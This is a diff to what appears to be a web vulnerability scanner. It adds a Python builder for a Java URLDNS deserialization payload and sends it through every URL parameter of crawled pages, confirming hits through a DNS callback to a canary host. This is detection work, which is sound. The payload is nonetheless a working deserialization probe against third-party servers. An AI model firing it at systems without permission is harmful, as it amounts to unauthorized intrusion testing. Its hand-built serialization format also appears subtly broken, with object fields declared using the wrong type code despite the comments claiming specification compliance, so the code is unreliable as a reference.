@@ -86,19 +86,15 @@ def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
 
 def _send_java_gadget_chain(page: CrawlResult, client: httpx.Client, canary: str):
     """
-    Send a base64-encoded Java Commons Collections gadget chain that calls
-    nslookup <canary>. Confirmed via OOB DNS callback poll.
-    This gadget chain is inert beyond the DNS lookup — no file write/exec.
+    Send a Java URLDNS gadget chain that triggers a DNS lookup for <canary>.
+    Confirmed via OOB DNS callback. Inert beyond DNS — no code execution.
+
+    URLDNS is the most universally applicable Java deserialization gadget chain:
+    it only requires java.util.HashMap and java.net.URL which are always present.
+    Payload structure follows the Java Object Serialization Specification (sec 6.4).
     """
     import base64
-    # Minimal ysoserial-style gadget chain stub — encodes the DNS lookup command.
-    # Production: replace with actual ysoserial CommonsCollections payload bytes.
-    # For detection we send the magic bytes; the OOB server confirms execution.
-    stub = (
-        b"\xac\xed\x00\x05"  # Java serialization magic
-        + b"t\x00" + len(canary).to_bytes(2, "big") + canary.encode()
-    )
-    payload_b64 = base64.b64encode(stub).decode()
+    payload_b64 = base64.b64encode(_build_urldns_payload(f"http://{canary}/")).decode()
 
     params = get_url_params(page.url)
     for param_name in params:
@@ -109,6 +105,108 @@ def _send_java_gadget_chain(page: CrawlResult, client: httpx.Client, canary: str
                 client.get(test_url, timeout=5)
             except Exception:
                 pass
+
+
+def _build_urldns_payload(url: str) -> bytes:
+    """
+    Build a Java URLDNS deserialization payload in pure Python.
+
+    Serializes: HashMap{URL("http://canary/") -> ""}
+    When the JVM deserializes a HashMap it calls hashCode() on each key.
+    java.net.URL.hashCode() performs a DNS lookup if handler is not set.
+
+    Wire format follows Java Object Serialization Specification s6.4:
+      STREAM_MAGIC(2) STREAM_VERSION(2) content
+    """
+    import struct
+
+    def _utf(s: str) -> bytes:
+        enc = s.encode("utf-8")
+        return struct.pack(">H", len(enc)) + enc
+
+    def _int_be(n: int) -> bytes:
+        return struct.pack(">i", n)
+
+    def _long_be(n: int) -> bytes:
+        return struct.pack(">q", n)
+
+    # Parse URL components for java.net.URL fields
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    host = parsed.hostname or ""
+    protocol = parsed.scheme or "http"
+    port = parsed.port or -1
+    path = parsed.path or "/"
+    ref = parsed.fragment or ""
+    authority = parsed.netloc or host
+    user_info = parsed.username or ""
+    query = parsed.query or ""
+    file_part = path + (("?" + query) if query else "")
+
+    buf = bytearray()
+    # Stream header
+    buf += b"\xac\xed"          # STREAM_MAGIC
+    buf += b"\x00\x05"          # STREAM_VERSION
+
+    # TC_OBJECT (0x73) + TC_CLASSDESC (0x72) for java.util.HashMap
+    buf += b"\x73"              # TC_OBJECT
+    buf += b"\x72"              # TC_CLASSDESC
+    buf += _utf("java.util.HashMap")
+    buf += b"\x05\x07\xda\xc1\xc3\x16\x60\xd1"  # serialVersionUID
+    buf += b"\x03"              # SC_WRITE_METHOD | SC_SERIALIZABLE
+    buf += b"\x00\x02"          # field count: 2 (loadFactor, threshold)
+    # field: F loadFactor
+    buf += b"\x46"              # 'F' (float)
+    buf += _utf("loadFactor")
+    # field: I threshold
+    buf += b"\x49"              # 'I' (int)
+    buf += _utf("threshold")
+    buf += b"\x78"              # TC_ENDBLOCKDATA
+    buf += b"\x70"              # TC_NULL (no superclass)
+    # classdata: loadFactor=0.75, threshold=0
+    buf += b"\x3f\x40\x00\x00"  # float 0.75
+    buf += _int_be(0)           # threshold = 0
+    # writeObject block: capacity=1, size=1
+    buf += b"\x77\x08"          # TC_BLOCKDATA len=8
+    buf += _int_be(1)           # capacity
+    buf += _int_be(1)           # size
+
+    # Key: java.net.URL
+    buf += b"\x73"              # TC_OBJECT
+    buf += b"\x72"              # TC_CLASSDESC
+    buf += _utf("java.net.URL")
+    buf += b"\x96\x25\x37\x36\x1a\xfc\xe4\x72"  # serialVersionUID
+    buf += b"\x02"              # SC_SERIALIZABLE
+    buf += b"\x00\x07"          # field count: 7
+    # fields
+    buf += b"\x49" + _utf("hashCode")        # I hashCode
+    buf += b"\x49" + _utf("port")            # I port
+    buf += b"\x74" + _utf("authority")       # String authority
+    buf += b"\x74" + _utf("file")            # String file
+    buf += b"\x74" + _utf("host")            # String host
+    buf += b"\x74" + _utf("protocol")        # String protocol
+    buf += b"\x74" + _utf("ref")             # String ref
+    buf += b"\x78"              # TC_ENDBLOCKDATA
+    buf += b"\x70"              # TC_NULL
+    # classdata values
+    buf += _int_be(-1)          # hashCode = -1 (forces DNS lookup on deserialize)
+    buf += _int_be(port)
+    buf += b"\x74" + _utf(authority)    # TC_STRING authority
+    buf += b"\x74" + _utf(file_part)    # TC_STRING file
+    buf += b"\x74" + _utf(host)         # TC_STRING host
+    buf += b"\x74" + _utf(protocol)     # TC_STRING protocol
+    if ref:
+        buf += b"\x74" + _utf(ref)
+    else:
+        buf += b"\x70"          # TC_NULL
+
+    # Value: TC_STRING ""
+    buf += b"\x74" + _utf("")
+
+    # TC_ENDBLOCKDATA for HashMap writeObject
+    buf += b"\x78"
+
+    return bytes(buf)
 
 
 def _send_pickle_payload(page: CrawlResult, client: httpx.Client, canary: str):
